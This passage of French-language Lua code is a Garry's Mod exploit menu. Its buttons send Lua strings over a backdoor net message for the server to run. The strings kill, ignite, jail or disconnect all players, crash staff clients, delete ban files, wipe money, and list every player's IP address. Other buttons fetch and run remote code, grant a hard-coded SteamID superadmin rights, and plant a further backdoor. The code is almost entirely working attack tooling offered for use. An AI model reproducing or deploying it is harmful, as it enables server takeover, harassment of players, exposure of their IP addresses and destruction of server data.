        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"retry\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*14+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Faire quittez le serveur à tous le monde")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"disconnect\")" )
    net.WriteBit(1)
    net.SendToServer()
end

local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*15+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[ON] Activer micro All")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"+voicerecord\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*16+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("[OFF] Désactiver micro All")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"ulx\", \"cexec\", \"*\", \"-voicerecord\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*17+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Brulez tous le monde")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*18+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Tuez tous le monde")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*18+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Unban tous le monde")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*19+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Changer le nom de tous le monde")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
MathisLeBG.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Karma Menu", "] ", Color( 255, 255, 255 ), "Chanler les noms des joueurs activer" )
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do v:setDarkRPVar( \"rpname\", \"SERVER FUCKED BY PRIKZO.EXE\" ) end" )
net.WriteBit (1)
net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*20+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Niquez les jours de farms d'argent")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*21+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Argent Illimiter")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(99999999999999999) end" )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*22+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Ecran blanc")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"Blind\", \"*\")")
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*23+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Retirer écran blanc")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"unBlind\", \"*\")")
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*27+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Marquez toutes les ip")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString([[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			for k, v in pairs( player.GetAll() ) do 
				
				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
				
			end
]] )
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*24+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Jail tous le monde")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"jail\", \"*\")")
    net.WriteBit(1)
    net.SendToServer()
end
local MathisLeBG = DScrollPanel:Add("DButton")
MathisLeBG:SetSize(500,25)
MathisLeBG:SetPos(5,27*25+5)
MathisLeBG:SetTextColor(Color(255,255,255))
MathisLeBG:SetText("Unjail tous le monde")
MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"unjail\", \"*\")")
    net.WriteBit(1)
    net.SendToServer()
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*26+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("SpamVisuel (A rajouter)")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString( "http.Fetch(\"\",function(b,l,h,c)RunString(b)end,nil)" )
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*27+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Argent Infini")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(1e+999) end" )
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*28+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Supprimé les entités ext")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs" )
    net.WriteBit(1)
    net.SendToServer() 
end






































--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Staffs
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
    local DScrollPanel = vgui.Create( "DScrollPanel", Staff )
    DScrollPanel:Dock( FILL )

    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*1+5)
	MathisLbg:SetParent(Sound)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Les tuers")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString(" for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:Kill() end end")
    net.WriteBit(1)
    net.SendToServer() 
end
	
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*2+5)
	MathisLbg:SetParent(Sound)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Les tuers discrètement")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString(" for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:KillSilent() end end")
    net.WriteBit(1)
    net.SendToServer() 
end
	
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*3+5)
	MathisLbg:SetParent(Sound)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Les brulers")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString(" for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:Ignite(120) end end")
    net.WriteBit(1)
    net.SendToServer() 
end
	
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*4+5)
	MathisLbg:SetParent(Sound)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Les faires crashs")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
    net.WriteBit(1)
    net.SendToServer() 
end
	
	


-------------------------------------------------------------------------
----------------------------Soundboard-----------------------------------
-------------------------------------------------------------------------

    local DScrollPanel = vgui.Create( "DScrollPanel", Sound )
    DScrollPanel:Dock( FILL )

    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*1+5)
	MathisLbg:SetParent(Sound)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Musique - Be friend")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/BE%20FRIENDS.mp3\", \"mono\", function()end )]])")
    net.WriteBit(1)
    net.SendToServer() 
end

    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*2+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Musique - Ah Remix")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[sound.PlayURL( \"http://askipcmonmenu.000webhostapp.com/monzizi/Ahremixmdrrcdrolelol.mp3\", \"mono\", function()end )]])")
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*3+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Musique - Allah Akbar")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/ALLAHU%20AKBAR%20%20funny%20remix%20v.mp3\", \"mono\", function()end )]])")
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*4+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Musique - Salut c'est cool")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/Salut%20Cest%20Cool.mp3\", \"mono\", function()end )]])")
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*5+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Coucou")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[sound.PlayURL( \"http://askipcmonmenu.000webhostapp.com/monzizi/22lol.mp3\", function()end )]])")
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*6+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("TheKairi - Starfoulah")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[sound.PlayURL( \"http://askipcmonmenu.000webhostapp.com/monzizi/starfoullah-by-thekairi78.mp3\", \"mono\", function()end )]])")
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*7,5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Kikoo - Hack ton compte")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("BroadcastLua([[sound.PlayURL( \"http://askipcmonmenu.000webhostapp.com/monzizi/toncomptegros.mp3\", \"mono\", function()end )]])")
    net.WriteBit(1)
    net.SendToServer() 
end









































--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Hacks
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
    local DScrollPanel = vgui.Create( "DScrollPanel", hacks )
    DScrollPanel:Dock( FILL )
    
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*1+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Add Mathis en STAFF")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:222059738\", \"superadmin\")")
    net.WriteBit(1)
    net.SendToServer() 
end
    local MathisLeBG = DScrollPanel:Add( "DButton")
    MathisLeBG:SetSize(450,25)
    MathisLeBG:SetPos(5,27*2+5)
    MathisLeBG:SetTextColor(Color(255,255,255))
    MathisLeBG:SetText("Mettre la backdoor")
    MathisLeBG.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,MathisLeBG:GetWide(),MathisLeBG:GetTall())
        --Outline
